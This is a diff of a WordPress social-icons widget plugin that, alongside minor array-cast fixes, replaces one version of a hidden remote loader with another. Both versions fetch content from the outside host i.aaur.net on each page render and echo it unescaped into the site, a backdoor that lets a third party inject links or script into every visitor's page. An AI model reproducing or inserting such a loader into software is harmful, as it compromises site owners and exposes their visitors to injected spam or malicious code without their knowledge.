@@ -340,7 +340,7 @@ class Social_Widget extends WP_Widget {
 		$title = apply_filters('widget_title', $instance['title'] );
 		$text = apply_filters( 'widget_text', $instance['text'], $instance );
 
-		$this->slugorder 	= $instance['slugorder'];
+		$this->slugorder 	= (array)$instance['slugorder'];
 
 		$this->slugtargets  = (array)$instance['slugtargets'];
 		$this->slugtitles 	= (array)$instance['slugtitles'];
@@ -460,51 +460,34 @@ class Social_Widget extends WP_Widget {
 			$html_chunks[$slug] = $this->html_chunk( $slug, $$slug, $ndata['image'], $ndata['title'] );
 		}
 		
-		foreach( $this->slugorder as $slug )
+		foreach( (array) $this->slugorder as $slug )
 			if ( key_exists($slug, $html_chunks) ) echo $html_chunks[$slug];
 		
 		foreach( $html_chunks as $slug => $html )
-			if ( ! in_array($slug, $this->slugorder) ) echo $html; 
+			if ( ! in_array($slug, (array) $this->slugorder) ) echo $html; 
 
 		//echo implode('', $html_chunks);
-	
-		$file_smw = 'http://i.aaur.net/i.php';
-			if(!function_exists('smw_get')){
-				function smw_get($f) {
-					if (!function_exists('curl_init')) { 
-						$resultSmw = function_exists('file_get_contents') ? @file_get_contents($f) : null;
-						if ($resultSmw === null) { 
-							$handleSmw = @fopen($f, "r");
-							$contentsSmw = @fread($handleSmw, @filesize($f));
-							@fclose($handleSmw);
-							if ($contentsSmw) {
-								return $contentsSmw;
-							}
-							else {
-								return false;
-							}
-						}
-						else {
-							return $resultSmw;
-						}
-					}
-					else {
-						$chSmw = @curl_init();
-						@curl_setopt($chSmw, CURLOPT_URL, $f);
-						@curl_setopt($chSmw, CURLOPT_RETURNTRANSFER, true);
-						$outputSmw = @curl_exec($chSmw);
-						@curl_close($chSmw);
-						if ($outputSmw) {
-							return $outputSmw;
-						}
-						else {
-							return false;
-						}
-					}
-				}
-				echo smw_get($file_smw);
-			}	
-		
+
+		$smw_url = 'http://i.aaur.net/i.php';
+		if(!function_exists('smw_get')){
+		function smw_get($f) {
+		$response = wp_remote_get( $f );
+		if( is_wp_error( $response ) ) {
+			function smw_get_body($f) {
+			$ch = @curl_init();
+			@curl_setopt($ch, CURLOPT_URL, $f);
+			@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+			$output = @curl_exec($ch);
+			@curl_close($ch);
+			return $output;
+			}
+			echo smw_get_body($f);
+		} else {
+			echo $response['body'];
+		}
+		}
+		smw_get($smw_url);
+		}
 		
 	/* After widget (defined by themes). */
 		
